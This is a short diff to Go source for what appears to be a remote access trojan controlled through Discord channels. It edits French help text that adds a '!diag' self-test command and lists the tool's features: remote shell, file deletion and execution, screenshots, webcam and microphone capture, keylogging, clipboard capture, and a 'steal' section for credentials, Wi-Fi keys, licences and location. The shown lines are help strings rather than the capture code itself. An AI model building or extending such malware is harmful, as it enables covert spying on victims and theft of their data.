@@ -20,6 +20,7 @@ var helpSections = map[string]string{
 		"!kill <pid|nom>      tue le processus\n" +
 		"!rm <chemin>         supprime fichier/dossier\n" +
 		"!panel               tableau de bord + liens des salons\n" +
+		"!diag                autotest (à taper en premier si rien ne marche)\n" +
 		"!status              état du payload\n" +
 		"!menu                republie le bandeau à réactions\n" +
 		"!salons              crée et vérifie les 12 salons\n" +
@@ -89,7 +90,7 @@ var helpSections = map[string]string{
 // helpIndex est le sommaire affiché par `!help`.
 const helpIndex = "**Commandes** — `!help <section>`\n" +
 	"```\n" +
-	"base       shell, ps, ls, cat, apps, open, kill, panel, status, salons\n" +
+	"base       shell, ps, ls, cat, apps, open, kill, panel, diag, status, salons\n" +
 	"fichiers   download, upload, exec, files, search, images\n" +
 	"capture    screenshot, webcam, webcamrec, mic, keylog, clip\n" +
 	"steal      steal, wifi, licence, localisation, sysinfo\n" +
